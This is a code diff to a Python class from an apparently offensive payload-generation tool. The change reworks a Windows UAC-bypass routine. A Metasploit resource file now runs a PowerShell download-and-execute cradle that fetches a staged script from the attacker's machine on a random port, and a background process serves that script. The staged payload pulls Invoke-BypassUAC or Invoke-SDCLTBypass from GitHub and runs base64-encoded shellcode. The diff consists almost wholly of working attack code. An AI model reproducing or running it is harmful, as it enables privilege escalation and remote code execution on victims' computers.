@@ -24,16 +24,20 @@ class EXTRAS(object):
             return self.ez2read_shellcode
 
     def UACBYPASS(self, version):
-        uacbypassrcfilecontents = """run post/windows/manage/exec_powershell SCRIPT=bypassuac.ps1 SESSION=1"""
+        randomPort = FUNCTIONS().randomUnusedPort()
+        uacbypassrcfilecontents = """run post/windows/manage/exec_powershell SCRIPT="IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/stage.ps1')" SESSION=1"""% (FUNCTIONS().CheckInternet(), randomPort)
         if version == "7":
             uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("https://github.com/PowerShellEmpire/Empire/raw/master/data/module_source/privesc/Invoke-BypassUAC.ps1");\nInvoke-BypassUAC -Command \"powershell -enc %s\" """ % (
             base64.b64encode(self.injectshellcode_nosleep.encode('utf_16_le')))
+            a = multiprocessing.Process(target=FUNCTIONS().stagePowershellCode, args=(uacbypassfilecontent, randomPort))
+            a.daemon = True
+            a.start()
         elif version == "10":
             uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-SDCLTBypass.ps1");\nInvoke-SDCLTBypass -Command \"powershell -enc %s\" """ % (
             base64.b64encode(self.injectshellcode_nosleep.encode('utf_16_le')))
-        with open('bypassuac.ps1', 'w') as uacbypassfile:
-            uacbypassfile.write(uacbypassfilecontent)
-            uacbypassfile.close()
+            a = multiprocessing.Process(target=FUNCTIONS().stagePowershellCode, args=(uacbypassfilecontent, randomPort))
+            a.daemon = True
+            a.start()
         with open('uacbypass.rc', 'w') as uacbypassfilerc:
             uacbypassfilerc.write(uacbypassrcfilecontents)
             uacbypassfilerc.close()
